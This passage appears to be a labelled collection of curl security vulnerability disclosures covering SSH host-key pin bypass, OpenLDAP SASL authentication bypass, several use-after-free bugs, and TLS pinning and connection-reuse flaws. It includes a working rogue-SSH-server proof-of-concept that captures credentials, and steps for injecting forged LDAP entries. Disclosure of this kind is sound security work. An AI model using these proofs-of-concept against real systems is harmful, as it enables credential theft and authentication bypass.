`CURLOPT_CAINFO_BLOB`, and the corresponding proxy options.



## Review

Decision: Accepted as a valid curl security issue.

Final severity: Medium. This is a TLS trust-policy state confusion issue on native-CA-enabled builds where the selected backend implements native trust lookup: an easy handle can retain automatic native trust after the application switches to custom CA material. Medium is appropriate because the effect can defeat an application's attempt to narrow trust, but exploitation requires a specific easy-handle reuse sequence, a new TLS handshake, an affected backend/build configuration, and an attacker certificate that chains to the native platform store but not to the intended custom trust bundle.

Technical notes: The finding correctly distinguishes automatic native trust from explicit `CURLSSLOPT_NATIVE_CA`. The stale-state problem is that `Curl_ssl_easy_config_complete` sets `native_ca_store` for default trust but does not recompute it back to false when later custom CA options are present. The Schannel path is not affected by this specific automatic-native branch because the code skips the auto-enable logic for Schannel.

## Impact

See description

title: CVE-2026-12064: proto-default skips SSH verification
body:
### Summary

When a user invokes curl with a schemeless URL and `--proto-default sftp` (or `scp`), the tool layer guesses the URL is HTTP and skips setting SSH security options (`CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256`, `CURLOPT_SSH_KNOWNHOSTS`). However libcurl's runtime correctly applies `--proto-default` and connects via SFTP/SCP. The result is that `--hostpubsha256`, `--hostpubmd5`, and `--knownhosts` are silently ignored — curl connects to an unverified SSH host and sends authentication credentials.

A network MITM attacker running a rogue SSH server captures the victim's password or triggers key-based auth against an attacker-controlled host, while curl reports no host key error.

### Affected version

Introduced in commit `f97d372703` (2025-05-15, "tool_operate: move config2setopts to separate file"), first released in **curl 8.14.0**. Present through current master (8.21.0-DEV).

### Root cause

In `src/config2setopts.c`, `url_proto_and_rewrite()` uses `CURLU_GUESS_SCHEME` to determine `use_proto`. For a schemeless URL like `host:2222/path`, it guesses HTTP. The SSH options gate on this guess:

```c
// src/config2setopts.c:190
if(use_proto != proto_scp && use_proto != proto_sftp)
  return CURLE_OK;  // skips setting CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256, CURLOPT_SSH_KNOWNHOSTS, etc.
```

But `CURLOPT_DEFAULT_PROTOCOL` is set later (line ~1053), and libcurl's `lib/url.c:1662` prepends `sftp://` at runtime. So the actual transfer uses SFTP with no host key verification configured.

### Steps To Reproduce

The PoC starts a Paramiko SSH server, then runs curl twice: once with explicit `sftp://` (host key check works) and once with `--proto-default sftp` + schemeless URL (host key check bypassed, password captured).

Prerequisites: `pip install paramiko`. Run from the curl source tree root (`~/curl/curl`).

```bash
#!/usr/bin/env bash
# Run from the curl source root: ~/curl/curl
# The local build at ./build-ssh/src/curl must have SFTP support (libssh2).
set -e

CURL_BIN="./build-ssh/src/curl"
export LD_LIBRARY_PATH="/tmp/libssh2-install/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"

echo "[*] Using: $CURL_BIN"
"$CURL_BIN" --version | head -2
if ! "$CURL_BIN" --version | grep -q sftp; then
  echo "FATAL: $CURL_BIN does not have SFTP support."; exit 1
fi
echo ""

python3 - "$CURL_BIN" <<'PYEOF'
import os, sys, socket, threading, time, subprocess

CURL_BIN = sys.argv[1]

import paramiko
host_key = paramiko.RSAKey.generate(2048)
host_fp_sha256 = "SHA256:" + __import__("base64").b64encode(
    __import__("hashlib").sha256(host_key.asbytes()).digest()
).decode().rstrip("=")

WRONG_PIN = "SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
captured_creds = []

class RogueServer(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        captured_creds.append(f"{username}:{password}")
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def get_allowed_auths(self, username):
        return "password"

def run_ssh_server(sock):
    conn, addr = sock.accept()
    transport = paramiko.Transport(conn)
    transport.add_server_key(host_key)
    try:
        transport.start_server(server=RogueServer())
        time.sleep(3)
    except Exception:
        pass
    finally:
        transport.close()
        conn.close()

def run_curl(args):
    env = os.environ.copy()
    return subprocess.run(
        [CURL_BIN, "-q", "--silent", "--show-error", "--max-time", "5",
         "--user", "victim:Secret123"] + args,
        text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10, env=env)

srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv_sock.bind(("127.0.0.1", 0))
srv_sock.listen(1)
PORT = srv_sock.getsockname()[1]

print(f"Rogue SSH server on 127.0.0.1:{PORT}")
print(f"Real fingerprint: {host_fp_sha256}")
print(f"Wrong pin:        {WRONG_PIN}\n")

# Test 1: explicit sftp:// with wrong pin — should REJECT and NOT send password
captured_creds.clear()
t = threading.Thread(target=run_ssh_server, args=(srv_sock,), daemon=True)
t.start()
p1 = run_curl(["--hostpubsha256", WRONG_PIN, f"sftp://127.0.0.1:{PORT}/tmp/file"])
t.join(timeout=5)
print(f"[explicit sftp://] exit={p1.returncode}")
print(f"  stderr: {p1.stderr.strip()[:200]}")
print(f"  creds captured: {captured_creds or '<none>'}")

# Test 2: --proto-default sftp + schemeless URL — BUG: skips pin, sends password
captured_creds.clear()
t = threading.Thread(target=run_ssh_server, args=(srv_sock,), daemon=True)
t.start()
p2 = run_curl(["--proto-default", "sftp", "--hostpubsha256", WRONG_PIN,
               f"127.0.0.1:{PORT}/tmp/file"])
t.join(timeout=5)
print(f"\n[--proto-default sftp] exit={p2.returncode}")
print(f"  stderr: {p2.stderr.strip()[:200]}")
print(f"  creds captured: {captured_creds or '<none>'}")

srv_sock.close()

print("\n--- RESULT ---")
if p1.returncode == 60 and captured_creds == ['victim:Secret123']:
    print("VULNERABLE: --proto-default sftp bypassed host key pin")
    print(f"  Password sent to rogue server: {captured_creds}")
elif p1.returncode == 60 and not captured_creds:
    print("NOT VULNERABLE: both paths correctly rejected the wrong pin.")
else:
    print(f"UNEXPECTED: test1_exit={p1.returncode}, test2_creds={captured_creds}")
PYEOF
```

Verified output on curl 8.21.0-DEV (libcurl/8.21.0-DEV OpenSSL/3.0.13 libssh2/1.11.2_DEV):

```text
[*] Built curl:
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.0.13 libssh2/1.11.2_DEV
Protocols: ... scp sftp ...

Rogue SSH server on 127.0.0.1:46363
Real fingerprint: SHA256:sBclp/HMFOJgNTOMMo5kDDg4bXCXVGcjStynZwsyiy4
Wrong pin:        SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[explicit sftp://] exit=60
  stderr: curl: (60) Denied establishing ssh session: mismatch SHA256 fingerprint. Remote sBclp/HMFOJgNTOMMo5kDDg4bXCXVGcjStynZwsyiy4= is not equal to SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  creds captured: <none>

[--proto-default sftp] exit=67
  stderr: curl: (67) Authentication failure
  creds captured: ['victim:Secret123']

--- RESULT ---
VULNERABLE: --proto-default sftp bypassed host key pin
  Password sent to rogue server: ['victim:Secret123']
```

### Expected behavior

`--hostpubsha256` (and `--knownhosts`) must be applied regardless of whether the SFTP scheme comes from the URL directly or from `--proto-default`. The host key mismatch should abort the connection before any authentication attempt.

### Actual behavior

With `--proto-default sftp` and a schemeless URL, the host key pin is silently discarded. curl proceeds to authenticate against the unverified host, sending the password to whatever SSH server answers at that address.

## Impact

## Summary:
A MITM attacker on the network path intercepts the SSH connection and presents their own host key. Because curl skipped the pin check, the victim's password (or other credential) is sent to the attacker's rogue SSH server (requires explicit command-line passing). The user believes they are protected by `--hostpubsha256` but the protection is silently absent.

This is a credential disclosure to a MITM — the user explicitly requested host verification, curl silently failed to enforce it, and the credential crossed the trust boundary to an unverified endpoint.

title: CVE-2026-13608: OpenLDAP SASL authentication bypass
body:
## Summary:
In `lib/openldap.c`, `oldap_state_sasl_resp()` transitions to `OLDAP_STOP` (connection ready)
whenever `Curl_sasl_continue()` returns `CURLE_OK` with `progress != SASL_INPROGRESS`. This
condition does not distinguish `SASL_DONE` (authentication completed) from `SASL_IDLE` (no
mechanism available). A malicious LDAP server can send a malformed SASL challenge, causing the
client to cancel the mechanism and retry with no remaining mechanisms. `Curl_sasl_start()` then
returns `CURLE_OK` with `progress == SASL_IDLE`, and the connection proceeds as if authentication
succeeded. This bypasses Kerberos (GSSAPI) mutual authentication: an attacker without a valid
keytab can impersonate a server and inject arbitrary LDAP responses.

## Affected version
```
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.0.13 zlib/1.3 mit-krb5/1.20.1 OpenLDAP/2.6.10
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS GSS-API HSTS HTTPS-proxy IPv6 Kerberos Largefile libz SPNEGO SSL threadsafe TLS-SRP UnixSockets
```

Tested on Ubuntu 24.04 (x86_64) against commit `68720b4837284335b2d63cb358f8f6ce65f5bc55` (HEAD
of master as of 2026-06-24). The vulnerable code has been present since the OpenLDAP SASL support
was introduced and is unchanged in the current release.

Platform: Linux 6.8.0, x86_64, MIT Kerberos 1.20.1, OpenLDAP 2.6.10.

## Steps To Reproduce:

### Prerequisites

1. curl/libcurl built with OpenLDAP backend (`-DUSE_OPENLDAP=ON`) and GSSAPI (`-DCURL_USE_GSSAPI=ON`)
2. A working Kerberos environment (KDC with realm, `kinit` to obtain a TGT)
3. Python 3 (for the mock server)

### Setup

```bash
# Build curl with OpenLDAP + GSSAPI
cmake -B build -DCURL_DISABLE_LDAP=OFF -DUSE_OPENLDAP=ON \
  -DCURL_USE_GSSAPI=ON -DCURL_USE_OPENSSL=ON -DCURL_USE_LIBPSL=OFF \
  -DCURL_USE_LIBIDN2=OFF -DCMAKE_BUILD_TYPE=Debug
cmake --build build -j$(nproc)

# Set up minimal KDC (example for MIT Kerberos)
sudo kdb5_util create -s -P testpass123          # realm: TEST.LOCAL
sudo kadmin.local -q "addprinc -pw testpass testuser@TEST.LOCAL"
sudo kadmin.local -q "addprinc -randkey ldap/localhost@TEST.LOCAL"
sudo kadmin.local -q "ktadd -k /tmp/ldap.keytab ldap/localhost@TEST.LOCAL"
sudo krb5kdc

# Obtain TGT
echo testpass | kinit testuser@TEST.LOCAL
```

### Mock LDAP server (attacker — has NO keytab)

Run the attached `mock_gssapi_server.py`:

```bash
python3 mock_gssapi_server.py 3893
```

The server triggers `SASL_CANCEL` as follows:

1. Advertises only GSSAPI in `supportedSASLMechanisms`.
2. Receives the client's SASL BindRequest containing a Kerberos AP-REQ (which it cannot decrypt).
3. Replies with `LDAP_SASL_BIND_IN_PROGRESS` (resultCode 14) and a garbage `serverSaslCreds`
   value (`\x60\x10\xDE\xAD...`). This invalid GSSAPI token causes `gss_init_sec_context()` to
   fail, which libcurl translates to `CURLE_BAD_CONTENT_ENCODING` — the condition that enters the
   `SASL_CANCEL` state.
4. Acknowledges the subsequent cancel BindRequest with `LDAP_SUCCESS` (resultCode 0).

### Trigger the bug

```bash
# Ensure valid TGT exists
klist

# Connect to malicious server with GSSAPI auth
./build/src/curl --user "testuser@TEST.LOCAL:testpass" \
    --login-options "AUTH=GSSAPI" \
    "ldap://localhost:3893/dc=example,dc=com?*?sub" \
    --connect-timeout 5 --max-time 10
```

### Expected result (fixed behavior)

curl should report authentication failure (exit code 67, `CURLE_LOGIN_DENIED`).

### Actual result

```
DN: cn=admin,dc=example,dc=com
	cn: admin
	uid: attacker-injected
	userPassword: {CLEAR}pwned
	sshPublicKey: ssh-ed25519 AAAA_ATTACKER_KEY attacker@evil
	description: INJECTED via CWE-306 Kerberos bypass

Exit code: 0
```

curl considers the connection authenticated and proceeds to execute the LDAP query. The attacker's
injected data is returned to the client as trusted LDAP results.

## Root Cause

In `lib/openldap.c` line 786:

```c
result = Curl_sasl_continue(&li->sasl, data, code, &progress);
if(!result && progress != SASL_INPROGRESS)   // ← does not distinguish SASL_DONE from SASL_IDLE
    oldap_state(data, li, OLDAP_STOP);
```

https://github.com/curl/curl/blob/68720b4837284335b2d63cb358f8f6ce65f5bc55/lib/openldap.c#L786-L787

When `Curl_sasl_continue()` enters the `SASL_CANCEL` case (`lib/curl_sasl.c` line 773-780), it
removes the failed mechanism and calls `Curl_sasl_start()`. If no mechanisms remain,
`Curl_sasl_start()` returns `CURLE_OK` with `*progress = SASL_IDLE` (line 519):

https://github.com/curl/curl/blob/68720b4837284335b2d63cb358f8f6ce65f5bc55/lib/curl_sasl.c#L519
https://github.com/curl/curl/blob/68720b4837284335b2d63cb358f8f6ce65f5bc55/lib/curl_sasl.c#L773-L780

### Suggested fix

```c
result = Curl_sasl_continue(&li->sasl, data, code, &progress);
if(!result && progress == SASL_DONE)          // ← only accept explicit completion
    oldap_state(data, li, OLDAP_STOP);
else if(!result && progress == SASL_IDLE)
    result = CURLE_LOGIN_DENIED;
```

## Impact

## Summary:
A malicious LDAP server (or network attacker in MITM position) can bypass SASL authentication in
libcurl's OpenLDAP backend by sending a single malformed SASL challenge. The most significant
impact is against GSSAPI (Kerberos), where the bypass nullifies mutual authentication: the client
proceeds without verifying the server holds a valid keytab. This allows the attacker to:

1. **Capture client queries** — leaking the LDAP search base DN, filter, and requested attributes.
2. **Inject arbitrary LDAP results** — the client accepts fabricated directory entries (e.g.,
   forged SSH public keys, group memberships, or credentials) as trusted data.

**Prerequisites:**

1. libcurl built with the OpenLDAP backend (`USE_OPENLDAP`) and Kerberos support.
2. The application must configure SASL authentication (e.g., `CURLOPT_LOGIN_OPTIONS "AUTH=GSSAPI"`).
3. The attacker must be positioned as MITM or control the target LDAP server's address (DNS
   poisoning, ARP spoofing, etc.).
4. The connection must not use LDAPS/TLS (or the client must not properly validate the server
   certificate), since TLS would independently block MITM.

The impact is highest in environments that rely on Kerberos for server identity verification on non-TLS LDAP connections.
---

The initial discovery was made by AI. All technical claims have been reviewed and revised by human experts.

Reporting on behalf of Autonomous Code Security (ACS) team at Microsoft.

title: CVE-2026-18924: HTTP/2 server push UAF
body:
## Summary

With a `CURLSH` sharing `CURL_LOCK_DATA_CONNECT` attached to an easy handle, libcurl creates the handle for an HTTP/2 server-pushed stream internally via `h2_duphandle()` → `curl_easy_duphandle()` (`lib/http2.c`). `curl_easy_duphandle()` does not copy `->share`, so that handle has `share == NULL`. `Curl_multi_add_perform()` then attaches it to the parent's connection, which is pooled in `share->cpool`.

When the pushed transfer ends, `cpool_get_instance()` resolves the pool from the handle:
`share == NULL` yields `multi->cpool`, not the `share->cpool` that owns the connection.
`cpool_remove_conn()` does not find the connection, so it is freed while still linked in
`share->cpool`'s bundle (`bits.in_cpool` remains TRUE). A later walk of `share->cpool`
dereferences the freed `connectdata`.

CWE-416 (use-after-free).

## Affected versions

* **curl 8.21.0** (tag `curl-8_21_0`).
* **master `2112f185c`** (2026-08-04, libcurl 8.22.0-DEV) — reproduces 3/3.

State of the three sites at `2112f185c`:

| site | state |
|---|---|
| `h2_duphandle` — `lib/http2.c:699` | calls `curl_easy_duphandle(data)`; `share` occurs 0 times in `lib/http2.c` |
| `curl_easy_duphandle` — `lib/easy.c:970` | does not copy `->share` |
| `cpool_get_instance` — `lib/conncache.c:256` | resolves the pool from the handle, not the connection |

## Reproduction

`repro.c` (attached) is standalone pure libcurl: an in-process thread serves raw h2c frames
over a socketpair via `CURLOPT_OPENSOCKETFUNCTION` + `CURL_SOCKOPT_ALREADY_CONNECTED`. No
network, no server, no TLS. It creates a `CURLSH` sharing `CURL_LOCK_DATA_CONNECT`, runs an
HTTP/2 transfer, accepts a `PUSH_PROMISE` (`CURL_PUSH_OK`), and the server sends `GOAWAY`.

Built against a release (`ENABLE_DEBUG=OFF`) + ASan libcurl:

```sh
cmake -S . -B build -DCMAKE_BUILD_TYPE=RelWithDebInfo -DENABLE_DEBUG=OFF \
  -DBUILD_SHARED_LIBS=OFF -DBUILD_CURL_EXE=OFF -DBUILD_TESTING=OFF \
  -DCURL_USE_OPENSSL=OFF -DUSE_NGHTTP2=ON -DCURL_USE_LIBPSL=OFF -DUSE_LIBIDN2=OFF \
  -DCURL_BROTLI=OFF -DCURL_ZSTD=OFF \
  -DCMAKE_C_FLAGS="-fsanitize=address -g -fno-omit-frame-pointer"
cmake --build build && cmake --install build

cc -fsanitize=address -g repro.c -o repro -I<prefix>/include \
   <prefix>/lib/libcurl.a -lnghttp2 -lz -lpthread -ldl
ASAN_OPTIONS=detect_leaks=0 ./repro
```

Result: heap-use-after-free, 3/3 runs, on both curl 8.21.0 and master `2112f185c`.

In a `DEBUGBUILD` libcurl the inconsistency aborts earlier at `DEBUGASSERT(NULL)`
`lib/conncache.c:179` ("Should have been in the bundle list") instead of reaching the free.

## AddressSanitizer output (master `2112f185c`, release + ASan)

`READ of size 8` into a freed 776-byte `connectdata` (the struct was 832 bytes in 8.21.0).
Full log: `asan-retest-master-2026-08-04.txt`.

```
READ of size 8:
  Curl_node_elem            lib/llist.c:237
  cpool_get_first           lib/conncache.c:142
  Curl_cpool_destroy        lib/conncache.c:242
  share_destroy             lib/curl_share.c:41
  curl_share_cleanup        lib/curl_share.c:370

freed by:
  Curl_cshutdn_terminate    lib/cshutdn.c:159
  cpool_discard_conn        lib/conncache.c:226
  Curl_conn_terminate       lib/conncache.c:692
  Curl_cpool_do_locked      lib/conncache.c:833
  multi_done                lib/multi.c:750
  multi_handle_timeout      lib/multi.c:1848
  multi_runsingle           lib/multi.c:2757
  multi_perform             lib/multi.c:2888

previously allocated by:
  allocate_conn             lib/url.c:1182
  url_create_needle         lib/url.c:2010
  url_find_or_create_conn   lib/url.c:2250
  Curl_connect              lib/url.c:2456
```

`verifynode()` (`lib/llist.c:36`) is `DEBUGBUILD`-only; in a release build the read lands at
`Curl_node_elem()`.

## Root cause

1. `curl_easy_duphandle()` does not copy `->share` (`docs/libcurl/curl_easy_duphandle.md`:
   the clone is "created as if `CURLOPT_SHARE` was set to NULL").
2. `push_promise()` → `h2_duphandle()` → `curl_easy_duphandle()` ⇒ pushed handle has
   `share == NULL`.
3. `push_promise()` → `Curl_multi_add_perform(data->multi, newhandle, cf->conn)` →
   `Curl_attach_connection(newhandle, cf->conn)` ⇒ the pushed handle holds the parent's
   connection, which is in `share->cpool`.
4. `cpool_get_instance(data)` (`lib/conncache.c:256`) returns `&data->share->cpool` only when
   `CURL_SHARE_KEEP_CONNECT(data->share)`; for the pushed handle it returns `multi->cpool`.
5. `multi_done()` → `Curl_cpool_do_locked()` → `Curl_conn_terminate()` →
   `cpool_remove_conn(multi->cpool, conn)`: the connection is not in that pool, so it is not
   unlinked and `bits.in_cpool` stays TRUE.
6. `cpool_discard_conn()` → `Curl_cshutdn_terminate()` frees the `connectdata`.
7. `curl_share_cleanup()` → `share_destroy()` → `Curl_cpool_destroy()` → `cpool_get_first()` → `Curl_node_elem()` reads the freed `connectdata`.

## Trigger

Application setup, all before the transfer starts:

```c
CURLSH *sh = curl_share_init();
curl_share_setopt(sh, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);
curl_easy_setopt(easy, CURLOPT_SHARE, sh);
curl_multi_setopt(multi, CURLMOPT_PUSHFUNCTION, push_cb);  /* returns CURL_PUSH_OK */
```

The push callback returns `CURL_PUSH_OK` and calls no libcurl function. No option or share is modified after the transfer starts. Single-threaded. The pushed-stream handle is created by libcurl, not by the application.

Server side: send `PUSH_PROMISE`, then end the pushed stream before it completes. The attached reproducer uses `GOAWAY`. `RST_STREAM`, connection close, `CURLOPT_TIMEOUT_MS` expiry, and `curl_multi_remove_handle()` of the pushed handle all reach `multi_done()` → `Curl_conn_terminate()` with the share-less handle.

## Suggested fix

Propagate the parent's share to the pushed handle in `h2_duphandle()`/`push_promise()` before `Curl_multi_add_perform()` (`newhandle->share = data->share;` plus refcount/lock handling), or terminate a connection against the cpool that owns it rather than
`cpool_get_instance(data)`.

## Attachments

| file | contents |
|---|---|
| `repro.c`, `run.sh` | standalone reproducer |
| `asan-retest-master-2026-08-04.txt` | ASan log, master `2112f185c` |
| `asan-standalone.txt` | ASan log, 8.21.0 |
| `asan-recover-master-2026-08-04.txt` | ASan log with `-fsanitize-recover`, showing all three reads |
| `repro-harness.bin` | original fuzzer input (debug build, asserts at `conncache.c:179`) |
| `RETEST-2026-08-04.md` | retest method and build details |

## Impact

The freed `connectdata` stays linked in `share->cpool`'s bundle with `bits.in_cpool` set, so it remains reachable from any subsequent operation on that pool — not only from
`curl_share_cleanup()`.

Measured on master `2112f185c` with a release + ASan libcurl built with
`-fsanitize-recover=address` and run under `ASAN_OPTIONS=halt_on_error=0`, so execution continues past the first error (`asan-recover-master-2026-08-04.txt`):

| # | access | offset into the freed 776-byte region | site |
|---|---|---|---|
| 1 | `READ of size 8` | 8 | `Curl_node_elem` — `lib/llist.c:237` |
| 2 | `READ of size 8` | 0 | `Curl_node_llist` — `lib/llist.c:269` |
| 3 | `READ of size 8` | 88 | `cpool_remove_conn` — `lib/conncache.c:169` |

Three reads of freed heap memory at three distinct offsets and three distinct sites. **No
write to the freed region was observed** in that run.

The connection object is heap-allocated by `allocate_conn()` (`lib/url.c:1182`) and freed by `Curl_cshutdn_terminate()` (`lib/cshutdn.c:159`); the interval between the free and the reads contains further libcurl allocation activity.

title: CVE-2026-19931: Negotiate ambient user conn reuse
body:
## Summary

On Windows with SSPI/Negotiate, curl 8.21.0 can reuse a connection authenticated with ambient credentials for a later request using different explicit credentials.

In `url_match_auth_nego()`, the credential comparison is skipped when `conn->creds == NULL`. This allows a connection authenticated as one identity to be reused for a request configured with another identity. In my reproducer, request A authenticates as `Administrator`, request B supplies credentials for `userB`, but the server processes B as `Administrator`.

curl 8.20.0 does not reproduce this issue.

## Affected version

Reproduced with libcurl 8.21.0 on Windows using SSPI/SPNEGO.

## Root cause

In 8.21.0:

```c
if(m->want_nego_http) {
  if(conn->creds &&
     (!Curl_creds_same(conn->creds, m->data->state.creds) ||
      !Curl_peer_equal(conn->creds_origin, m->data->state.origin)))
    return FALSE;
}
```

The credential/origin comparison is only performed when `conn->creds` is non-NULL. Connections authenticated through ambient SSPI credentials can have `conn->creds == NULL`, so the check is skipped.

## Steps To Reproduce

1. Run the attached local Windows Negotiate server.
2. Run the PoC as Windows user A (`Administrator` in my test).
3. Request A uses `CURLAUTH_NEGOTIATE` without explicit credentials.
4. Request B uses another easy handle on the same `CURLM` with explicit credentials for `userB`.
5. On curl 8.21.0, request B reuses A's connection.

Observed:

```text
8.20.0:
A default        -> Administrator
B explicit userB -> userB

8.21.0:
A default        -> Administrator
B explicit userB -> Administrator
```

Disabling connection reuse causes B to authenticate correctly as `userB`.

Attached:

* `poc.c` - minimal libcurl reproducer
* `server.cs` - minimal local Negotiate server

## Impact

A request configured for one user may execute using the identity of a previously authenticated pooled connection.

## Suggested fix

The credential/origin comparison should depend on whether the connection has entered Negotiate authentication state, rather than whether `conn->creds` is non-NULL:

```diff
 if(m->want_nego_http) {
-  if(conn->creds &&
+  if((conn->http_negotiate_state != GSS_AUTHNONE) &&
      (!Curl_creds_same(conn->creds, m->data->state.creds) ||
       !Curl_peer_equal(conn->creds_origin, m->data->state.origin)))
     return FALSE;
 }
```

title: CVE-2026-80229: OpenSSL provider use-after-free
body:
## Summary

When `CURLOPT_SSLENGINE` is set (e.g. `"default"` on OpenSSL 3.x), `ossl_set_provider()` (line 1791) allocates a per-handle `OSSL_LIB_CTX` and stores it in `data->state.libctx`. During TLS connection setup, `SSL_CTX_new_ex()` (line 3750) receives this library context and embeds a pointer to it inside the newly created `SSL_CTX`. The `SSL_CTX` is owned by the connection filter attached to the pooled connection — its lifetime is independent of the easy handle.

When `curl_easy_cleanup()` is called on the originating handle, `ossl_close_all()` → `ossl_provider_cleanup()` (line 2001) calls `OSSL_LIB_CTX_free(data->state.libctx)` (line 1752), destroying the library context. The pooled connection's `SSL_CTX` now holds a dangling pointer. When a second easy handle reuses this pooled connection via the multi handle's connection cache, any SSL operation — session resumption, re-handshake, cipher lookup — dereferences the freed `OSSL_LIB_CTX`, producing a heap-use-after-free.

The bug is a lifetime mismatch: `data->state.libctx` is scoped to the easy handle, but `SSL_CTX_new_ex()` borrows it without taking ownership, and the resulting `SSL_CTX` outlives the easy handle via connection pooling.


## Preconditions

- libcurl built with OpenSSL 3.x (`OPENSSL_HAS_PROVIDERS` defined)
- `CURLOPT_SSLENGINE` set on at least one easy handle (triggers `ossl_set_provider`)
- Easy handle cleaned up while its TLS connection remains pooled in a multi handle
- A subsequent easy handle reuses that pooled connection

## Root cause trace

1. `curl_easy_setopt(CURLOPT_SSLENGINE, "default")` → `Curl_ssl_set_engine` → `ossl_set_engine` → `ossl_set_provider` (line 1768).
2. `ossl_set_provider` calls `OSSL_LIB_CTX_new()` (line 1791), stores result in `data->state.libctx`.
3. On TLS connect, `ossl_connect_common` → `ossl_connect_step1` reaches `SSL_CTX_new_ex(data->state.libctx, data->state.propq, req_method)` (line 3750). The `SSL_CTX` stores the `libctx` pointer internally.
4. Transfer completes. `curl_multi_remove_handle` detaches the easy handle; the TLS connection moves to the multi handle's connection pool.
5. `curl_easy_cleanup(data)` → `ossl_close_all(data)` → `ossl_provider_cleanup(data)` → `OSSL_LIB_CTX_free(data->state.libctx)` (line 1752). The `libctx` is freed.
6. A new easy handle B with matching connection parameters is added to the same multi handle. `Curl_ssl_conn_config_match` finds the pooled connection (engine/provider is not compared in `match_ssl_primary_config`).
7. B reuses the pooled connection. Any SSL operation on the `SSL_CTX` dereferences the freed `libctx` → heap-use-after-free.

## Remediation

The `OSSL_LIB_CTX` must outlive every `SSL_CTX` that references it. Options:

1. **Reference-count the library context** and share ownership between the easy handle and the connection filter's `SSL_CTX`. Release only when both are done.
2. **Transfer ownership to the SSL_CTX wrapper** (`struct ossl_ctx`): move `libctx` out of `data->state` into `octx` when `SSL_CTX_new_ex` is called. `ossl_close` (connection teardown) frees it instead of `ossl_close_all` (handle teardown).
3. **Duplicate the library context** per connection, so each `SSL_CTX` owns its own copy. More expensive but simplest lifetime model.

## Impact

Under ASan, the dereference triggers an immediate crash. Without ASan, behavior is undefined: the freed heap region may be reallocated to attacker-controlled data, potentially allowing corruption of OpenSSL internal state. In a multi-tenant application using `CURLOPT_SSLENGINE` with a shared multi handle, this creates a use-after-free on every pooled TLS connection whose originating easy handle is cleaned up before the connection is evicted.

title: CVE-2026-80230: OpenSSL pinning bypass
body:
## Summary

`Curl_ossl_check_peer_cert()` (line 4795) calls `SSL_get1_peer_certificate()`. When no peer certificate is available — as with anonymous cipher suites like `AECDH-AES128-SHA` — the function returns NULL. The subsequent guard at lines 4798–4799 checks `!(conn_config->verifypeer || conn_config->verifyhost)`; when both are disabled (`--insecure`), it executes `goto out`, jumping past `ossl_check_pinned_key()` at line 4874 and returning `CURLE_OK`.

This means a user who specifies `--insecure --pinnedpubkey <hash>` expects certificate verification to be relaxed but public-key pinning to remain enforced. Instead, the pin check is silently skipped when the server presents no certificate.

## Preconditions

- libcurl built with OpenSSL
- Client sets `--insecure` (or `CURLOPT_SSL_VERIFYPEER=0`, `CURLOPT_SSL_VERIFYHOST=0`)
- Client sets `--pinnedpubkey` with a specific hash
- Client allows an anonymous cipher suite (e.g. `--ciphers AECDH-AES128-SHA:@SECLEVEL=0`)
- TLS version ≤ 1.2 (`--tls-max 1.2`) — TLS 1.3 does not support anonymous authentication
- Server configured with matching anonymous cipher (no certificate loaded)

## Reproduction

The PoC (`poc.py`) starts a Python TLS server with `AECDH-AES128-SHA` (no certificate), then invokes:

```sh
/opt/curl/bin/curl --insecure \
  --pinnedpubkey "sha256//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" \
  --ciphers "AECDH-AES128-SHA:@SECLEVEL=0" \
  --tls-max 1.2 \
  https://127.0.0.1:PORT/
```

**Success criterion:** curl exits 0 and receives the HTTP response. Expected behavior: `CURLE_SSL_PINNEDPUBKEYNOTMATCH` (exit 90).

**Negative control:** Same wrong pin against a server with a real certificate → curl exits 90. This confirms the pin check functions when a certificate is present.

## Root cause trace

1. Client connects with `--insecure` and `--pinnedpubkey <hash>`, negotiating an anonymous cipher.
2. `Curl_ossl_check_peer_cert()` calls `SSL_get1_peer_certificate(octx->ssl)` → returns NULL (line 4795).
3. Guard at line 4798: `!(conn_config->verifypeer || conn_config->verifyhost)` → TRUE because `--insecure` disables both.
4. `goto out` (line 4799) jumps to line 4876, skipping `ossl_check_pinned_key()` at line 4874.
5. `result` is still `CURLE_OK` → function returns success.
6. curl completes the transfer without checking the public-key pin.

## Remediation

Before the `goto out` at line 4799, check whether `pinned_key` is set. If a pin is configured but no certificate is available to verify it against, return `CURLE_SSL_PINNEDPUBKEYNOTMATCH` instead of silently succeeding. Alternatively, restructure the function to always reach `ossl_check_pinned_key()` when `pinned_key` is non-NULL, regardless of the `verifypeer`/`verifyhost` state.

## Impact

An active MITM attacker who controls the network can force negotiation of an anonymous cipher (if the client allows it via `--ciphers`) and intercept traffic even though the client specified a public-key pin. The attack requires the client to use `--insecure` (or `CURLOPT_SSL_VERIFYPEER=0`) together with `--pinnedpubkey`, and the client must allow an anonymous cipher suite. While `--insecure` already weakens security, users who combine it with pinning rely on the pin as their sole authentication — this bypass removes that guarantee.
label: real

title: CVE-2026-80231: native CA store conn reuse
body:
## Summary

`native_ca_store` is in `struct ssl_config_data` (line 73 of `vtls_config.h`), not `ssl_primary_config`. `match_ssl_primary_config()` does not compare it. On macOS, `Curl_ssl_easy_config_complete()` (line 258) auto-sets `native_ca_store = TRUE` when no custom CA is configured — without modifying `ssl_options`. When `CURL_CA_BUNDLE` is defined, the auto-fill gives both transfers the same `primary.CAfile`, making all primary config fields match while `native_ca_store` differs.

